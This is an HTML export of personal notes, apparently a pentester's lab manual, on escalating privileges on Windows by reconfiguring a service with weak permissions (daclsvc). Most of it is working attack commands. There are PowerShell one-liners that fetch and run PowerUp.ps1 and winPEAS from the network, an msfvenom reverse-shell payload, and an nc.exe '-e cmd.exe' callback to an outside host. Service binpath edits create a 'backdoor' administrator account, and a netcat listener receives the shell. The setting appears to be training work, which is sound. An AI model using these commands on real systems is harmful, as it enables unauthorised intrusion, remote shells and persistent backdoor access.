<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>manual</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>manual</h1><br/><br /><br /><strong>1. Run winPEAS to check for service misconfigurations:</strong><br />   ◇ <span style="text-decoration:underline;">AccessChk</span>(old version for command line): <a href="https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip%22,%20%22$env:userprofile/desktop/Accesschk.zip">https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip%22,%20%22$env:userprofile/desktop/Accesschk.zip</a><br />    We can check for &#39;Everyone&#39; ,&#39;Authenticated Users&#39;, $env:username<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; (<span style="color:#ff9d00;font-weight:700">new-object</span> System.Net.WebClient).DownloadFile(<span style="color:#3ad900;font-weight:400">&quot;https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip&quot;</span>, <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.zip&quot;</span>);<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.zip&quot;</span>;<span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\&quot;</span>;[<span style="color:#7f0044;font-weight:400">void</span>] (<span style="color:#ff9d00;font-weight:700">New-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">-</span>ItemType Directory <span style="color:#ff9d00;font-weight:700">-</span>Force);<span style="color:#0088ff;font-weight:400">$Shell</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">new-object</span> <span style="color:#ff9d00;font-weight:700">-</span>com Shell.Application;<span style="color:#0088ff;font-weight:400">$Shell</span>.Namespace(<span style="color:#0088ff;font-weight:400">$DestinationFolder</span>).copyhere(<span style="color:#0088ff;font-weight:400">$Shell</span>.NameSpace(<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span>).Items(),<span style="color:#333333;font-weight:400">4</span>);<span style="color:#ff9d00;font-weight:700">Invoke-Expression</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\accesschk.exe /accepteula -uwcqv &#39;Everyone&#39; *&quot;</span>;<span style="color:#ff9d00;font-weight:700">Invoke-Expression</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\accesschk.exe /accepteula -uwcqv &#39;Authenticated Users&#39; *&quot;</span>;<span style="color:#ff9d00;font-weight:700">Invoke-Expression</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\accesschk.exe /accepteula -uwcqv $env:username *&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.exe&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Eula.txt&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.zip&quot;</span>;</pre></div><br />        <a href=""><img src="images/1320-1.png" alt="images/1320-1.png" /></a><br />        We have to check for service with:<br />         1&gt;  SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS<br />         2&gt;  SERVICE_STOP and SERVICE_START          <br />   ◇ <span style="text-decoration:underline;">PowerUp.ps1</span>: with method Get-ModifiableService<br />        Enumerates all services using Get-Service and uses Test-ServiceDaclPermission to test if the current user has rights to change the service configuration.<br />        <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">IEX</span>(<span style="color:#ff9d00;font-weight:700">New-Object</span> Net.WebClient).downloadstring(<span style="color:#333333;font-weight:400">&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1&#39;</span>);<span style="color:#00117f;font-weight:400">Get-ModifiableService</span></pre></div><br />        <a href=""><img src="images/1320-2.png" alt="images/1320-2.png" /></a><br />   ◇ WinPeas: <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe</a><br />      <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; (<span style="color:#ff9d00;font-weight:700">new-object</span> System.Net.WebClient).DownloadFile(<span style="color:#3ad900;font-weight:400">&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe&quot;</span>, <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\winPEASany.exe&quot;</span>);<span style="color:#ff9d00;font-weight:700">Invoke-Expression</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\winPEASany.exe quiet servicesinfo&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\winPEASany.exe&quot;</span>;</pre></div>  <br />        <a href=""><img src="images/1320-3.png" alt="images/1320-3.png" /></a><br /><br />2. OPTIONAL: check permission of the vulnerable service in the <a href="indows_Privilege_Escalation--2._Service_Exploits--Insecure_Service_Permissions_(weak_folder_permissions)--manual--permission_of_a_service.html">subchapter permission of a service</a>    <br /><br /><strong>3. Confirm what we have found:</strong><br />     ◇ <span style="text-decoration:underline;">AccessChk</span>(old version for command line):<br />    In the <span style="color:#a5452a;">example</span> below we check daclsvc, the vulnerable service found before<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; (<span style="color:#ff9d00;font-weight:700">new-object</span> System.Net.WebClient).DownloadFile(<span style="color:#3ad900;font-weight:400">&quot;https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip&quot;</span>, <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.zip&quot;</span>);<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.zip&quot;</span>;<span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\&quot;</span>;[<span style="color:#7f0044;font-weight:400">void</span>] (<span style="color:#ff9d00;font-weight:700">New-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">-</span>ItemType Directory <span style="color:#ff9d00;font-weight:700">-</span>Force);<span style="color:#0088ff;font-weight:400">$Shell</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">new-object</span> <span style="color:#ff9d00;font-weight:700">-</span>com Shell.Application;<span style="color:#0088ff;font-weight:400">$Shell</span>.Namespace(<span style="color:#0088ff;font-weight:400">$DestinationFolder</span>).copyhere(<span style="color:#0088ff;font-weight:400">$Shell</span>.NameSpace(<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span>).Items(),<span style="color:#333333;font-weight:400">4</span>);<span style="color:#ff9d00;font-weight:700">Invoke-Expression</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\accesschk.exe /accepteula -uwcqv $env:username daclsvc&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.exe&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Eula.txt&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.zip&quot;</span>;</pre></div><br />    <a href=""><img src="images/1320-4.png" alt="images/1320-4.png" /></a><br />    <br /><strong>4. Check the current configuration of the service</strong><br />    It need to run with the <span style="color:#00ff00;">SYSTEM</span> user permissions, to take advantage from it<br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; <span style="color:#ff9d00;font-weight:700">sc</span> qc [service]</pre></div><br />    <a href=""><img src="images/1320-5.png" alt="images/1320-5.png" /></a><br /><br /><strong>5. Check the current status of the service</strong><br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; <span style="color:#ff9d00;font-weight:700">sc</span> query [service]</pre></div><br />    <a href=""><img src="images/1320-6.png" alt="images/1320-6.png" /></a><br />    <br />6<strong>. Reconfigure the service, following we have these alternatives:<br />   </strong>◇ to use our reverse shell executable:<br />       <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; <span style="color:#ff9d00;font-weight:700">sc</span> config daclsvc binpath<span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;\&quot;</span>C<span style="color:#ff9d00;font-weight:700">:\</span>PrivEsc<span style="color:#ff9d00;font-weight:700">\</span>reverse.exe<span style="color:#ff9d00;font-weight:700">\</span><span style="color:#3ad900;font-weight:400">&quot;&quot;</span></pre></div><br />       <a href=""><img src="images/1320-7.png" alt="images/1320-7.png" /></a><br />       reverse.exe is a payload created with msfvenom<br />       <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># msfvenom -p windows<span style="color:#ff9d00;font-weight:700">/</span>x64<span style="color:#ff9d00;font-weight:700">/</span>shell_reverse_tcp LHOST=192.168.147.139 LPORT=53 -f exe -o reverse.exe</pre></div><br />       <a href=""><img src="images/1320-8.png" alt="images/1320-8.png" /></a>       <br />   ◇ substitute with malicious executable<br />      <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; <span style="color:#ff9d00;font-weight:700">sc</span> config [service name] binpath<span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;malicious executable path&quot;</span> <span style="color:#0088ff;font-weight:400">#example: &quot;cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe&quot;</span></pre></div><br />   ◇ sc: add an Administrator account<br />      <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; <span style="color:#ff9d00;font-weight:700">sc</span> config [service name] binpath<span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;net user admin password /add&quot;</span><br />C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; <span style="color:#ff9d00;font-weight:700">sc</span> stop [service name]<br />C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; <span style="color:#ff9d00;font-weight:700">sc</span> <span style="color:#ff9d00;font-weight:700">start</span> [service name]<br />C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; <span style="color:#ff9d00;font-weight:700">sc</span> config [service name] binpath<span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;net localgroup Administrators admin /add&quot;</span>    <span style="color:#0088ff;font-weight:400">#add user Admin to Administrators</span><br />C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; <span style="color:#ff9d00;font-weight:700">sc</span> stop [service name]<br />C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; <span style="color:#ff9d00;font-weight:700">sc</span> <span style="color:#ff9d00;font-weight:700">start</span> [service name]</pre></div><br />   ◇ powerup.ps1: add Administrator account <br />      <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">IEX</span>(<span style="color:#ff9d00;font-weight:700">New-Object</span> Net.WebClient).downloadstring(<span style="color:#333333;font-weight:400">&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1&#39;</span>);<span style="color:#00117f;font-weight:400">Install-ServiceBinary</span> <span style="color:#333333;font-weight:400">-Name</span> <span style="color:#333333;font-weight:400">&#39;daclsvc&#39;</span> <span style="color:#ff9d00;font-weight:700">-</span>Command “net user backdoor Password123<span style="color:#ff9d00;font-weight:700">!</span> <span style="color:#ff9d00;font-weight:700">/</span>add &amp;&amp; timeout <span style="color:#ff9d00;font-weight:700">/</span>t <span style="color:#333333;font-weight:400">5</span> &amp;&amp; net localgroup Administrators backdoor <span style="color:#ff9d00;font-weight:700">/</span>add”</pre></div><br />        <a href=""><img src="images/1320-9.png" alt="images/1320-9.png" /></a><br />        <a href=""><img src="images/1320-10.png" alt="images/1320-10.png" /></a><br />       <a href=""><img src="images/1320-11.png" alt="images/1320-11.png" /></a><br /><br /><strong>6. Start a listener on Kali, and then start the service to trigger the exploit</strong>:<br />   1) Listener on kali<br />       <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># nc -nvlp 53</pre></div><br />   2) Start the service<br />      ▪ net<br />          <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\&gt;</span> net start daclsvc</pre></div><br />      ▪ sc<br />          <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; <span style="color:#ff9d00;font-weight:700">sc</span> <span style="color:#ff9d00;font-weight:700">start</span> &lt;serviceName&gt;</pre></div><br />      ▪ Start-Service powershell cmdlet<br />          <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">start-service</span> <span style="color:#333333;font-weight:400">-name</span> &lt;serviceName&gt;</pre></div><br />   3) if we have used:<br />      ◇ a reverse shell<br />           <a href=""><img src="images/1320-12.png" alt="images/1320-12.png" /></a><br />      ◇ an administrator account:<br />        <div class="codebox"><pre>PS&gt; net user<br />PS&gt; net localgroup Administrators</pre></div><br />        <a href=""><img src="images/1320-13.png" alt="images/1320-13.png" /></a><br />           <br /><br /><br /><br /><br />Bibliography<br />• <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#modify-service-binary-path">https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#modify-service-binary-path</a><br />• <a href="https://pentestlab.blog/2017/03/30/weak-service-permissions/">https://pentestlab.blog/2017/03/30/weak-service-permissions/</a><br />• <a href="https://sec-consult.com/blog/detail/what-unites-hp-philips-and-fujitsu-one-service-and-millions-of-vulnerable-devices/">https://sec-consult.com/blog/detail/what-unites-hp-philips-and-fujitsu-one-service-and-millions-of-vulnerable-devices/</a><br /> </div>
</body>
</html>
